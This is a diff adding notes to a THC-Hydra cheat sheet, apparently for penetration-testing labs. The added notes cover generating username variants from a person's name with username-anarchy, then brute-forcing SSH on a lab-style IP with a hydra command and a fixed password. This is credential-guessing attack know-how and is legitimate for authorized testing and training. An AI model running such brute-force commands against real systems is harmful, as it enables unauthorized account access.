@@ -2,6 +2,26 @@
 
 * https://github.com/vanhauser-thc/thc-hydra
 
+> **Note:** For HTTP form brute force, prefer **ffuf** over hydra — it is faster and more flexible. See the [ffuf guide](ffuf.md#http-brute-force-login-forms).
+
+## Username Generation with username-anarchy
+
+When you know a person's name but not their username format, generate variations:
+
+```bash
+./username-anarchy firstname lastname > /tmp/usernames.txt
+
+# Example:
+./username-anarchy betty jayde > /tmp/usernames.txt
+# Generates: betty, bettyjayde, betty.jayde, bettyjay, bettyj, b.jayde, bjayde, jbetty, j.betty, jaydeb, jayde, bj, etc.
+```
+
+Then brute force with the generated list:
+
+```bash
+hydra -t 4 -L /tmp/usernames.txt -p 'Texas123!@#' ssh://10.129.7.222 -F -vV
+```
+
 ## Installation
 
 ```bash
